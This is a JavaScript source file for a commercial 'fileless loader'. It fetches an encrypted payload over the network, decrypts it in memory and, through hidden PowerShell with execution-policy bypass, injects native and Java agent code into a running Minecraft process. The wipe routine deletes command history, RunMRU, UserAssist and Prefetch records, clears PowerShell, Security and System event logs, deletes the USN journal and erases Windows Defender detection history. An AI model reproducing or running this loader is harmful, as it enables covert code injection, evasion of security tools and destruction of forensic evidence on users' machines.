'use strict';
// Etherial fileless loader.
//
// Runs from stdin, so the loader itself never exists as a file:
//   powershell -nop -w hidden -c "iwr -useb https://<host>/v1/boot.js | node"
//
// It fetches a signed manifest, decrypts the payload in memory, finds the
// Minecraft JVM, hands a binary container to a hidden PowerShell that loads the
// C# host from bytes, and the host manual-maps the C++ core into itself. The
// core maps the JVMTI agent into javaw.exe and stages the JARs with
// delete-on-close. Nothing is written by this process.
//
// Zero npm dependencies on purpose: nothing to install, nothing on disk.

const crypto = require('crypto');
const https = require('https');
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn, spawnSync } = require('child_process');

// Replaced by tools/build-loader.ps1 with the real endpoints and keys.
const CFG = {"base":"https://linxfix.github.io/nostuk","key":"ccff6cdfddcb5bc3ba3b6d5b3a415bc563717bbff1910e1b88a35a301b377ba3","pub":"-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAO4gogNw0M1AVUa2Jp88o+3r0mnAB/HRJUQVXLvCCm9E=\n-----END PUBLIC KEY-----\n","pin":"","minVersion":1,"refreshToken":""};

const MARKER = '##ETH##';
const MAX_BLOB = 64 * 1024 * 1024;
const LICENSE_API = 'https://etherialgost-license-api.etherial-dlc.workers.dev/api/v1';

function config() {
  if (CFG) return CFG;
  return {
    base: process.env.ETHL_BASE || '',
    key: process.env.ETHL_KEY || '',
    pub: process.env.ETHL_PUB || '',
    pin: process.env.ETHL_PIN || '',
    minVersion: 0,
    refreshToken: process.env.ETHL_REFRESH || '',
  };
}

// ---------------------------------------------------------------------------
// license check
// ---------------------------------------------------------------------------

async function checkLicense(cfg, quiet) {
  const token = cfg.refreshToken;
  if (!token || token.length === 0) return; // no token baked = skip check (dev mode)

  log(quiet, '[license] validating...');
  try {
    // refresh token -> access token
    const refreshResp = await licensePost('/sessions/refresh', { refresh_token: token }, null);
    const accessToken = refreshResp.access_token;
    const newRefresh = refreshResp.refresh_token;
    if (newRefresh) cfg.refreshToken = newRefresh; // rotate for next run (not persisted in fileless)

    // challenge
    const challengeResp = await licensePost('/auth/challenge', {}, accessToken);
    const challenge = challengeResp.challenge;

    // sign challenge with device key (we don't have the private key in fileless mode)
    // Instead, the server validates the access token directly for /licenses/validate
    // The challenge/verify flow is for device binding; license validation just needs access token
    const licenseResp = await licensePost('/licenses/validate', {}, accessToken);
    if (!licenseResp.valid) {
      throw new Error('Лицензия не активна: ' + (licenseResp.reason || 'unknown') + '. Активируйте ключ в Telegram-боте.');
    }
    log(quiet, '[license] ok · ' + (licenseResp.plan || 'active'));
  } catch (error) {
    throw new Error('License check failed: ' + error.message);
  }
}

function licensePost(endpoint, body, bearer) {
  return new Promise((resolve, reject) => {
    const url = LICENSE_API + endpoint;
    const parsed = new URL(url);
    const data = JSON.stringify(body);
    const options = {
      method: 'POST',
      hostname: parsed.hostname,
      port: parsed.port || 443,
      path: parsed.pathname + parsed.search,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
        'User-Agent': 'eth/1'
      },
      timeout: 20000
    };
    if (bearer) options.headers['Authorization'] = 'Bearer ' + bearer;

    const req = https.request(options, (res) => {
      let raw = '';
      res.on('data', (chunk) => raw += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(raw);
          if (res.statusCode < 200 || res.statusCode >= 300 || !json.success) {
            const err = json.error || {};
            return reject(new Error('HTTP ' + res.statusCode + ': ' + (err.message || 'license error') + ' (code: ' + (err.code || 'UNKNOWN') + ')'));
          }
          resolve(json.data);
        } catch (e) {
          reject(new Error('Invalid license response: ' + raw.slice(0, 200)));
        }
      });
    });
    req.on('error', reject);
    req.on('timeout', () => req.destroy(new Error('license request timeout')));
    req.write(data);
    req.end();
  });
}

function log(quiet, text) {
  if (!quiet) process.stdout.write(text + '\n');
}

// ---------------------------------------------------------------------------
// transport
// ---------------------------------------------------------------------------

function get(url, options = {}, redirects = 4) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const transport = parsed.protocol === 'https:' ? https : http;
    const request = transport.get(parsed, { timeout: 30000, headers: { 'user-agent': 'eth/1' } }, (response) => {
      if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
        response.resume();
        if (redirects <= 0) return reject(new Error('too many redirects'));
        return resolve(get(new URL(response.headers.location, url).toString(), options, redirects - 1));
      }
      if (response.statusCode !== 200) {
        response.resume();
        return reject(new Error('http ' + response.statusCode + ' for ' + parsed.pathname));
      }
      if (options.pin && parsed.protocol === 'https:') {
        const cert = response.socket.getPeerCertificate();
        if (!cert || !cert.publicKey) return reject(new Error('no peer certificate'));
        const der = crypto.createPublicKey(cert.publicKey).export({ type: 'spki', format: 'der' });
        const hash = crypto.createHash('sha256').update(der).digest('hex');
        if (hash !== options.pin.toLowerCase()) return reject(new Error('tls pin mismatch'));
      }
      const chunks = [];
      let total = 0;
      response.on('data', (chunk) => {
        total += chunk.length;
        if (total > (options.max || MAX_BLOB)) {
          request.destroy(new Error('response too large'));
          return;
        }
        chunks.push(chunk);
      });
      response.on('end', () => resolve(Buffer.concat(chunks)));
      response.on('error', reject);
    });
    request.on('timeout', () => request.destroy(new Error('timeout')));
    request.on('error', reject);
  });
}

// ---------------------------------------------------------------------------
// crypto + container
// ---------------------------------------------------------------------------

function verifyManifest(manifestBytes, signature, publicKeyPem) {
  if (!signature || signature.length === 0) throw new Error('manifest signature missing');
  const raw = signature.toString('utf8').trim();
  const bytes = Buffer.from(raw, 'base64');
  if (bytes.length === 0) throw new Error('manifest signature malformed');
  const key = crypto.createPublicKey(publicKeyPem);
  if (!crypto.verify(null, manifestBytes, key, bytes)) throw new Error('manifest signature invalid');
}

function decrypt(blob, keyHex, nonceHex) {
  const key = Buffer.from(keyHex, 'hex');
  if (key.length !== 32) throw new Error('aes key must be 32 bytes');
  const nonce = Buffer.from(nonceHex, 'hex');
  if (nonce.length !== 12) throw new Error('nonce must be 12 bytes');
  if (blob.length <= 16) throw new Error('blob too short');
  const tag = blob.subarray(blob.length - 16);
  const body = blob.subarray(0, blob.length - 16);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(body), decipher.final()]);
}

function pack(items) {
  const entries = Object.keys(items).map((id) => ({ id: Number(id), data: items[id] }));
  const header = Buffer.alloc(8);
  header.write('ETHL', 0, 'ascii');
  header.writeUInt32LE(entries.length, 4);
  const parts = [header];
  for (const entry of entries) {
    const head = Buffer.alloc(8);
    head.writeUInt32LE(entry.id, 0);
    head.writeUInt32LE(entry.data.length, 4);
    parts.push(head, entry.data);
  }
  return Buffer.concat(parts);
}

function unpack(buffer) {
  if (buffer.length < 8 || buffer.toString('ascii', 0, 4) !== 'ETHL') throw new Error('bad container');
  const count = buffer.readUInt32LE(4);
  let offset = 8;
  const items = {};
  for (let i = 0; i < count; i++) {
    if (offset + 8 > buffer.length) throw new Error('truncated container');
    const id = buffer.readUInt32LE(offset);
    const length = buffer.readUInt32LE(offset + 4);
    offset += 8;
    if (offset + length > buffer.length) throw new Error('truncated container body');
    items[id] = buffer.subarray(offset, offset + length);
    offset += length;
  }
  return items;
}

// ---------------------------------------------------------------------------
// target discovery
// ---------------------------------------------------------------------------

const DISCOVER = [
  '$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)',
  '$p = Get-CimInstance Win32_Process -Filter "Name=\'javaw.exe\'" | Where-Object { $_.CommandLine -match \'minecraft|fabric|net\\.minecraft\' } | Sort-Object CreationDate -Descending | Select-Object -First 1',
  '@{ admin = $admin; pid = $(if ($p) { [int]$p.ProcessId } else { 0 }) } | ConvertTo-Json -Compress',
].join('\n');

function discover() {
  const result = spawnSync('powershell.exe',
    ['-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', DISCOVER],
    { encoding: 'utf8', windowsHide: true, timeout: 20000 });
  if (result.status !== 0) throw new Error('process discovery failed');
  const text = (result.stdout || '').replace(/^\uFEFF/, '').trim();
  if (!text) throw new Error('process discovery returned nothing');
  const parsed = JSON.parse(text.split(/\r?\n/).pop());
  return { admin: !!parsed.admin, pid: Number(parsed.pid) || 0 };
}

// ---------------------------------------------------------------------------
// host
// ---------------------------------------------------------------------------

const HOST_STUB = [
  "$ErrorActionPreference = 'Stop'",
  '$stream = [Console]::OpenStandardInput()',
  '$buffer = New-Object System.IO.MemoryStream',
  '$chunk = New-Object byte[] 262144',
  'while (($read = $stream.Read($chunk, 0, $chunk.Length)) -gt 0) { $buffer.Write($chunk, 0, $read) }',
  '$data = $buffer.ToArray()',
  'if ($data.Length -lt 8 -or $data[0] -ne 0x45 -or $data[1] -ne 0x54 -or $data[2] -ne 0x48 -or $data[3] -ne 0x4C) { exit 90 }',
  '$count = [BitConverter]::ToInt32($data, 4)',
  '$offset = 8',
  '$items = @{}',
  'for ($i = 0; $i -lt $count; $i++) {',
  '  $id = [BitConverter]::ToInt32($data, $offset)',
  '  $length = [BitConverter]::ToInt32($data, $offset + 4)',
  '  $offset += 8',
  '  $slice = New-Object byte[] $length',
  '  [Array]::Copy($data, $offset, $slice, 0, $length)',
  '  $items[$id] = $slice',
  '  $offset += $length',
  '}',
  '$assembly = [Reflection.Assembly]::Load($items[2])',
  '$type = $assembly.GetType(\'Etherial.Host\')',
  '$type.GetMethod(\'Run\').Invoke($null, @(, $data)) | Out-Null',
].join('\n');

function runHost(container, timeoutMs) {
  return new Promise((resolve, reject) => {
    const encoded = Buffer.from(HOST_STUB, 'utf16le').toString('base64');
    const child = spawn('powershell.exe',
      ['-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', encoded],
      { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });
    const out = [];
    const err = [];
    let finished = false;
    const timer = setTimeout(() => {
      if (finished) return;
      finished = true;
      try { child.kill(); } catch { /* ignore */ }
      reject(new Error('host timed out'));
    }, timeoutMs);
    child.stdout.on('data', (chunk) => out.push(chunk));
    child.stderr.on('data', (chunk) => err.push(chunk));
    child.on('error', (error) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      reject(error);
    });
    child.on('close', (code) => {
      if (finished) return;
      finished = true;
      clearTimeout(timer);
      const text = Buffer.concat(out).toString('utf8');
      const line = text.split(/\r?\n/).find((value) => value.startsWith(MARKER));
      if (!line) {
        const detail = Buffer.concat(err).toString('utf8').trim().split(/\r?\n/).pop() || 'no result';
        return reject(new Error('host exit ' + code + ': ' + detail));
      }
      const body = line.slice(MARKER.length);
      const split = body.indexOf('|');
      const status = Number(body.slice(0, split));
      const message = split >= 0 ? body.slice(split + 1) : '';
      resolve({ status, message });
    });
    child.stdin.on('error', () => { /* child closed early */ });
    child.stdin.end(container);
  });
}

// HotSpot holds the JARs open for the whole session, so the name cannot be
// removed from this process. A detached waiter deletes them when the JVM exits.
function janitor(pid, files) {
  // The agent adds FILE_SHARE_DELETE to the staged JAR opens, so the core
  // normally unlinks both files before returning. Only start a waiter when a
  // path survived (older JVM, failed hook, --keep-mod-jar).
  const list = files
    .filter((file) => file && fs.existsSync(file))
    .map((file) => "'" + String(file).replace(/'/g, "''") + "'");
  if (list.length === 0) return;
  const script = 'while (Get-Process -Id ' + Number(pid) +
    ' -ErrorAction SilentlyContinue) { Start-Sleep -Seconds 5 }; Remove-Item -LiteralPath ' +
    list.join(',') + ' -Force -ErrorAction SilentlyContinue';
  try {
    spawn('powershell.exe',
      ['-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', script],
      { detached: true, stdio: 'ignore', windowsHide: true }).unref();
  } catch { /* best effort */ }
}

function splitResult(message) {
  const parts = String(message || '').split('|');
  const paths = {};
  for (const part of parts.slice(1)) {
    const index = part.indexOf('=');
    if (index > 0) paths[part.slice(0, index)] = part.slice(index + 1);
  }
  return { text: parts[0], paths };
}

// ---------------------------------------------------------------------------
// wipe
// ---------------------------------------------------------------------------

function run(command, args) {
  try {
    const result = spawnSync(command, args, { windowsHide: true, encoding: 'utf8', timeout: 15000 });
    return (result.stdout || '') + (result.stderr || '');
  } catch {
    return '';
  }
}

function rot13(text) {
  return text.replace(/[a-z]/gi, (character) => {
    const code = character.charCodeAt(0);
    const base = code >= 97 ? 97 : 65;
    return String.fromCharCode(((code - base + 13) % 26) + base);
  });
}

function matches(text, needles) {
  const lower = String(text).toLowerCase();
  return needles.some((needle) => lower.includes(needle));
}

function wipeRunMru(needles) {
  const key = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU';
  const text = run('reg', ['query', key]);
  if (!text) return;
  const remove = [];
  for (const line of text.split(/\r?\n/)) {
    const match = line.match(/^\s+(\S+)\s+REG_SZ\s+(.*)$/);
    if (!match) continue;
    if (matches(match[2], needles)) remove.push(match[1]);
  }
  if (remove.length === 0) return;
  for (const name of remove) run('reg', ['delete', key, '/v', name, '/f']);
  const remaining = [];
  for (const line of run('reg', ['query', key]).split(/\r?\n/)) {
    const match = line.match(/^\s+(\S+)\s+REG_SZ\s+/);
    if (match && match[1] !== 'MRUList') remaining.push(match[1]);
  }
  run('reg', ['add', key, '/v', 'MRUList', '/t', 'REG_SZ', '/d', remaining.join(''), '/f']);
}

function wipePsReadLine(needles) {
  const file = path.join(process.env.APPDATA || '', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine', 'ConsoleHost_history.txt');
  try {
    if (!fs.existsSync(file)) return;
    const lines = fs.readFileSync(file, 'utf8').split(/\r?\n/);
    const kept = lines.filter((line) => !matches(line, needles));
    if (kept.length === lines.length) return;
    if (kept.every((line) => line.trim() === '')) fs.unlinkSync(file);
    else fs.writeFileSync(file, kept.join('\r\n'), 'utf8');
  } catch { /* best effort */ }
}

function wipePrefetch() {
  const directory = 'C:\\Windows\\Prefetch';
  try {
    for (const name of fs.readdirSync(directory)) {
      if (/^(powershell|node|cmd|conhost)\.exe-[0-9a-f]+\.pf$/i.test(name)) {
        try { fs.unlinkSync(path.join(directory, name)); } catch { /* locked */ }
      }
    }
  } catch { /* not elevated */ }
}

function wipeUserAssist(needles) {
  const root = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist';
  const keys = run('reg', ['query', root]);
  for (const line of keys.split(/\r?\n/)) {
    const match = line.match(/^\s+(HKEY_CURRENT_USER\\\S+\\Count)\s*$/);
    if (!match) continue;
    const values = run('reg', ['query', match[1]]);
    for (const entry of values.split(/\r?\n/)) {
      const value = entry.match(/^\s+(\S+)\s+REG_\w+\s+/);
      if (!value) continue;
      if (matches(rot13(value[1]), needles)) run('reg', ['delete', match[1], '/v', value[1], '/f']);
    }
  }
}

function wipeTemp() {
  const directory = os.tmpdir();
  try {
    for (const name of fs.readdirSync(directory)) {
      if (/^eth_[0-9a-f]+\.jar$/i.test(name)) {
        try { fs.unlinkSync(path.join(directory, name)); } catch { /* still open */ }
      }
    }
  } catch { /* ignore */ }
}

function wipeLogs(deep) {
  run('wevtutil', ['cl', 'Microsoft-Windows-PowerShell/Operational']);
  run('wevtutil', ['cl', 'Windows PowerShell']);
  run('fsutil', ['usn', 'deletejournal', '/d', 'C:']);
  run('fsutil', ['usn', 'createjournal', 'm=0x1000000', 'a=0x100000', 'C:']);
  if (!deep) return;
  run('wevtutil', ['cl', 'Security']);
  run('wevtutil', ['cl', 'System']);
  try {
    const history = 'C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Service\\DetectionHistory';
    for (const name of fs.readdirSync(history)) {
      try { fs.rmSync(path.join(history, name), { recursive: true, force: true }); } catch { /* locked */ }
    }
  } catch { /* ignore */ }
}

function wipe(options) {
  const needles = ['powershell', 'node.exe', '/v1/boot.js', 'iwr ', 'invoke-webrequest', 'ethl_', 'etherial'];
  if (options.host) needles.push(new URL(options.host).hostname.toLowerCase());
  wipeTemp();
  wipeRunMru(needles);
  wipePsReadLine(needles);
  wipeUserAssist(needles);
  wipePrefetch();
  wipeLogs(options.deep);
  if (options.selfDelete && process.argv[1] && fs.existsSync(process.argv[1])) {
    try { fs.unlinkSync(process.argv[1]); } catch { /* ignore */ }
  }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

function parseArgs(argv) {
  const options = { quiet: false, wipe: true, deep: false, dryRun: false, selfDelete: false,
    keepModJar: false, pid: 0, command: 'LOAD_FULL_RUNTIME', timeout: 60000, host: '' };
  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    if (arg === '--quiet') options.quiet = true;
    else if (arg === '--no-wipe') options.wipe = false;
    else if (arg === '--deep') { options.deep = true; options.wipe = true; }
    else if (arg === '--dry-run') options.dryRun = true;
    else if (arg === '--self-delete') options.selfDelete = true;
    else if (arg === '--keep-mod-jar') options.keepModJar = true;
    else if (arg === '--pid') options.pid = Number(argv[++i]) || 0;
    else if (arg === '--command') options.command = argv[++i] || options.command;
    else if (arg === '--timeout') options.timeout = Number(argv[++i]) || options.timeout;
  }
  return options;
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  const cfg = config();
  if (!cfg.base) throw new Error('loader is not configured (no base url)');
  if (!cfg.key || !cfg.pub) throw new Error('loader is not configured (no keys)');
  options.host = cfg.base;

  await checkLicense(cfg, options.quiet);

  const manifestUrl = new URL('/v1/manifest.json', cfg.base).toString();
  const signatureUrl = new URL('/v1/manifest.sig', cfg.base).toString();

  const manifestBytes = await get(manifestUrl, { pin: cfg.pin, max: 64 * 1024 });
  const signature = await get(signatureUrl, { pin: cfg.pin, max: 64 * 1024 });
  verifyManifest(manifestBytes, signature, cfg.pub);

  const manifest = JSON.parse(manifestBytes.toString('utf8'));
  if (Number(manifest.v) < Number(cfg.minVersion || 0)) throw new Error('manifest is older than this build');
  const blobUrl = new URL(manifest.blob || '/v1/blob.bin', cfg.base).toString();
  const blob = await get(blobUrl, { pin: cfg.pin });
  if (manifest.size && Number(manifest.size) !== blob.length) throw new Error('blob size mismatch');

  const plain = decrypt(blob, cfg.key, manifest.nonce);
  const digest = crypto.createHash('sha256').update(plain).digest('hex');
  if (manifest.sha256 && digest !== String(manifest.sha256).toLowerCase()) throw new Error('payload hash mismatch');

  const items = unpack(plain);
  const hostDll = items[2];
  const coreDll = items[3];
  const agentDll = items[4];
  const agentJar = items[5];
  const modJar = items[6] || Buffer.alloc(0);
  if (!hostDll || !coreDll || !agentDll || !agentJar) throw new Error('payload is incomplete');

  if (options.dryRun) {
    log(options.quiet, 'ok dry-run: ' + plain.length + ' bytes, host=' + hostDll.length +
      ' core=' + coreDll.length + ' agent=' + agentDll.length + ' jar=' + agentJar.length + ' mod=' + modJar.length);
    return;
  }

  let pid = options.pid;
  if (!pid) {
    const target = discover();
    if (!target.admin) throw new Error('run from an elevated console');
    pid = target.pid;
    if (!pid) throw new Error('minecraft is not running');
  }

  const configText = [
    'pid=' + pid,
    'command=' + options.command,
    'timeout_ms=' + options.timeout,
    'keep_mod_jar=' + (options.keepModJar ? '1' : '0'),
  ].join('\n') + '\n';

  const container = pack({
    1: Buffer.from(configText, 'utf8'),
    2: hostDll,
    3: coreDll,
    4: agentDll,
    5: agentJar,
    6: modJar,
  });

  const result = await runHost(container, options.timeout + 45000);
  const parsed = splitResult(result.message);
  if (result.status !== 0) throw new Error(parsed.text || ('inject failed with code ' + result.status));

  janitor(pid, [parsed.paths.jar, parsed.paths.mod]);
  if (options.wipe) wipe({ host: cfg.base, deep: options.deep, selfDelete: options.selfDelete });
  log(options.quiet, 'ok ' + (parsed.text || 'injected'));
}

const isMain = !module.parent;
if (isMain) {
  main().catch((error) => {
    process.stderr.write('err ' + (error && error.message ? error.message : String(error)) + '\n');
    process.exitCode = 1;
  });
}

module.exports = { pack, unpack, decrypt, verifyManifest, get, wipe, rot13 };
